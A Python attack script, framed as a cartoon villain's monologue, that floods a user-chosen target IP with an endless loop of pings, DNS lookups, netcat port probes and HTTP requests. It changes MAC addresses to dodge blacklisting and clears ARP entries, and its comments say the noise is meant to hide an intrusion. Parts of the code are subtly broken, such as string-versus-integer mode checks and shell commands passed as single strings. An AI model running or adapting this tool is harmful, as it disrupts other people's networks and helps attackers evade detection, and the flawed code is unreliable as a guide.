"""
 Ah, Perry the Platypus, what a surprise!
 You are now trapped by my useless comments! They are so in character
 that you will be so engrossed in my monologue that you will never be able
 to read the actual code, and thus you will even read this in my voice using my
 "Read-This-In-My-Voice"-Inator! And while you do, I shall take over... the entire!!!
 TRI-STATE AREA! HAHAHAHahahaha!

 You might be wondering, "Why would the programmer bother with this? What emotionally
 intense backstory could possibly have made him so drastically evil?" Well, you see,
 it all began back in Gimmelshtump on my 12th birthday. My family was so bad at
 blue teaming, they would have me read all the wireshark packets on the network
 for hours and hours. Because we were so poor, we had to write our firewalls directly
 through the linux command lines and never run scripts to do it. And so, I developed a
 deep hatred for having to look for meaningful packets on our network. And now, Perry
 the Platypus, I have invented my latest evil invention...

 BEHOLD!! THE DISTRACT-INATOR!!!

 This EVIL device will spend random packets from different IPS and MAC addresses to
 a server, clogging their network with meaningless packets and distracting them, making
 it difficult to find any actually meaningful information from their packet tracers!
 Not even their precious filters and firewalls will be able to stop the flood! And
 as they try and fail to sift through the noise, I will be able to waltz into their
 server, and TAKE OVER THE ENTIRE TRI-STATE AREA! HAHAHAHAahaha!
"""
import random
import subprocess
import requests


class Params:
    # Target server IP (needed)
    target = ""
    # Attack type
    selection_atk = 1
    # Network interface
    net = ""


# Prints the intro and art. Ignore this if you're trying to view the actual code.
def ascii_art():
    # Ascii Art of Dr. Heinz Doofenshmirtz
    print("\n                                                                  ,#@@&/.          ,#@&,\n",
    "                                                                       ,#@&*            /@(\n",
    "                                                                            .#@(           &#\n",
    "                                                                                ,&%.        .@*\n",
    "                                                                                   *@,        @/\n",
    "                                                               ,((,                  ,@.       &/\n",
    "                                                             &%        *#&@@(,.        &/      .@    .(@@%/.     ./@@&%\n",
    "                                                           %%                  .*%@@#*..@,      %%&&/       *%@#.\n",
    "                                                         %&                            ,/#      ,       /&%,\n",
    "                                                       &%            ,*(%%%%%%#/.                    %@*\n",
    "                                                     %%     ,%@@&/.           ,,,,(@%              .**/(#%&@@@@@@@@&#(/,\n",
    "                                                   %@.(@@%.       *&@@%/.                                             %(\n",
    "                                                 (@%.       *@@#.                .*%@@@@/.      #@@#,                *& \n",
    "                                                           (%               .#@%@#        #@,      %&,(&&*           &* \n",
    "                                                           @,           *&@* .&#            ,@*      %%   .#@(      ##  \n",
    "                                                          %(        *&@,   .@(               ,@@.     .@*     ,@%  ,@.  \n",
    "                                                         ,@.     &@*      &#                 /& &*      #%       *@@*   \n",
    "                                                         &*  (@#        %&                   %/  &(      *@        *    \n",
    "                                                        /@@&,         %%                    .@    &(      *@,           \n",
    "                                                        /           #&                      %#     &%@&(,               \n",
    "                                                                  /@.                      .@,                          \n",
    "                                                                *@@@@@@@@@@@@%*            (#                           \n",
    "                                                              /@@@@@@@,                   .@.                           \n",
    "                                                            ,@@@@@%                       (%                            \n",
    "                                                           &@@@@,                         @                             \n",
    "                                                         &@@@@**(#%%#(/,                 %#\n",
    "                                               *#  ,   %@@@@*            *&&,           .@.\n",
    "                                #&@@@@@@@@%*    ,@(#((@@@@,                 .&#         ##\n",
    "                            &@@@@@@@@@@@@@@@@@@@&/@@@@@@(          &&(&@@@@%  ,@.      .@.\n",
    "                         *&(,  ,@#          (@@@@@@@@@&          *&     &@@@@, .@      /&\n",
    "                              @/              ,@@@#              #@@(*(@@@@@@(  &,     &*\n",
    "                             %(            ..(@@@@,               &@@@@@@@@@@   @.    ,@       *%@%/*,*/%@/\n",
    "                             &,            /@@@@@@,                 /&@@@&*    @/     ##   *@%,           *@\n",
    "                             (&              #@@@@*                           @/      &/,@#    #@*#        @*\n",
    "                              /@.                ,@/                        &&        @@    (@* *(        .@,\n",
    "                                (@*            #@, /@*                   /@(        /&.   ((  *@@@@/      &/\n",
    "                                   ,#&@&&&@@&(        #@#,          ,#@%,                     . .&&     .@/\n",
    "                                       /&      (/          ,**//*,.          ,*((*          .(%#,     .&%\n",
    "                                      #@#%&(,                        .(&@#,. &(@,                  .%@*\n",
    "                       .(&@@&(*.                                 (@@,       ,@ %/    (#/@@@@&@@@@%,\n",
    "                  #@(                                        *@& ##         @, %/    *&\n",
    "             ,%*                                         .%@*    %(        (%  %/    .@.\n",
    "          //                     .**/#%%%#(*,         .&&,       &*       ,@   @,     &(\n",
    "       //              ,(%&@&#/, /&                ,&%,          @.       &*  ,@.     .@\n",
    "    ,#         .(&@@#*.         *@              (@(              ,       &/   ##       ,@.\n",
    "  /#     .%@@#.                 @.          /@@.                     ,#&@@   *&          #&                     #@@%@@(\n",
    "#(  .%@%.                      &(      ,@@@.                ,#@@@#.       #& @,             &@(              &&.      .@\n",
    "&&%,                           .#&&%(,    (#       .*%@&%*                 *@.                   /%&@@@@&&@@@@&&&@\n",
    "                                          .@(%@@&*                        &#                                    ,@\n",
    "                                      (@#*.    #(                      *@#                                      ,@\n",
    "                                    .@,                         ,#&@@(.                                         ,@\n",
    "                                   .@.            .*#&@@@@%/.                                                   ,@     %\n",
    "                                .,/@@@@@@@%/*.                                            ../#&@@@@@@@@&@&##(//(##    %(\n",
    "                         &&(,                                                 .,(&@&%(*.                @*          *@,\n",
    "                         @/                                            ,(&@#/.                          *@.       /@*\n",
    "                          ,@%                                     /&&(.                                 %#.(@@@@%*\n",
    "                            @/                               .%@/                                     .@,   .@\n",
    "                          /@.                            .@@*                                        #&      @.\n",
    "                         %%                          /@&,                                          .@*       &*\n",
    "                        (&                      ,%@#                                              (&         &*\n",
    "                       .@.                 *%@#,                                                   *@*       &*\n",
    "                       @*           *%@&/.                                                          .@(     &*         ")
    # Text for DISTRACT-INATOR
    print("  ____    ___   ____    _____   ____       _       ____   _____           ___   _   _      _      _____    ___    ____\n",
    "|  _ \  |_ _| / ___|  |_   _| |  _ \     / \     / ___| |_   _|         |_ _| | \ | |    / \    |_   _|  / _ \  |  _ \ \n",
    "| | | |  | |  \___ \    | |   | |_) |   / _ \   | |       | |    _____   | |  |  \| |   / _ \     | |   | | | | | |_) |\n",
    "| |_| |  | |   ___) |   | |   |  _ <   / ___ \  | |___    | |   |_____|  | |  | |\  |  / ___ \    | |   | |_| | |  _ < \n",
    "|____/  |___| |____/    |_|   |_| \_\ /_/   \_\  \____|   |_|           |___| |_| \_| /_/   \_\   |_|    \___/  |_| \_\ \n",
    "_______________________________________________________________________________________________________________________")
    print("\t\t\t\t\t\t\t    V.1.0.0 - Written by Cameron MacDonald (chm7374@rit.edu)\n",
          "_______________________________________________________________________________________________________________________\n")


# This function calls for all specifications before the attack begins.
def user_prompts():
    print("NOTE: This program should be run with admin privileges on a linux box.\n")
    # Target server IP (needed)
    target = input("Enter the IP address of the target ( EX: 192.168.1.1 ): ")
    # Letting the program know if this attack V1 or V2
    print("\nDISTRACT-INATOR must be run on a linux machine on/able to connect to the target network:" +
    "\nSelection attack set 1 means the program will be running on a machine directly" +
    "\nconnected to a network, and the program will not run any admin commands." +
    "\nSelection attack set 2 means the program will be running on a machine seperate" +
    "\nfrom a network, meaning the target can be communicated with wirelessly (like a" +
    "\nweb server), so the program will expect to be run on a root machine.")
    attack_mode = input("Enter 1 or 2: ")
    # If attacking remotely, it needs the name of the remote machine's network interface
    int_name = "eth0"
    if attack_mode == "2":
       int_name = input("What is the name of this devices network interface?: ")
    print("\n______________________________________________________________________")
    attack = Params()
    attack.target = target
    attack.selection_atk = attack_mode
    attack.net = int_name
    print("Beginning attack in 3...2...1...")
    print("______________________________________________________________________\n")
    return attack


def install_macchanger( ):
    subprocess.run("wget http://ftp.club.cc.cmu.edu/pub/gnu/macchanger/macchanger-1.6.0.tar.gz")
    subprocess.run("tar xvfvz macchanger-1.6.0.tar.gz")
    subprocess.run("cd macchanger-1.6.0")
    subprocess.run("./configure")
    subprocess.run("make")
    subprocess.run("sudo make install")


def random_ip():
    random_target = ""
    for i in range(4):
        temp_ip = random.randint(0, 255)
        random_target += str(temp_ip)
        if i < 3: random_target += "."
    return random_target


def distraction_packets( params ):
    # Send ping to target IP.
    distract_ping = subprocess.run(["ping", "-c", str(random.randint(1,2)), params.target])
    # Send DNS to target IP.
    distract_dns = subprocess.run(["nslookup", params.target])
    # Send TCP to target IP and random port.
    distract_tcp = subprocess.run(["nc", "-z", "-n", params.target, str(random.randint(1, 63000))])
    # http packets to random urls
    response = requests.get("http://www.google.com/")
    # send ping to random ips
    if params.selection_atk == 1:
        subprocess.run(["ping", "-c", str(random.randint(1,2)), random_ip()])
        subprocess.run(["ping", "-c", str(random.randint(1, 2)), random_ip()])


def remote_distraction( params ):
    # Change MAC to prevent blacklisting
    change_mac = subprocess.run(["macchanger", "-r", params.net])
    # Clear ARP tables
    subprocess.run(["arp", "-d", params.target])
    distraction_packets( params )


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    # First the ascii art is printed.
    ascii_art()
    # Next the user is prompted for specifications.
    attack_parameters = user_prompts()
    if attack_parameters.selection_atk == 2:
        install_macchanger()
    distraction_packets( attack_parameters )
    # The program will run infinitely until force closed.
    while True:
        remote_distraction(attack_parameters)
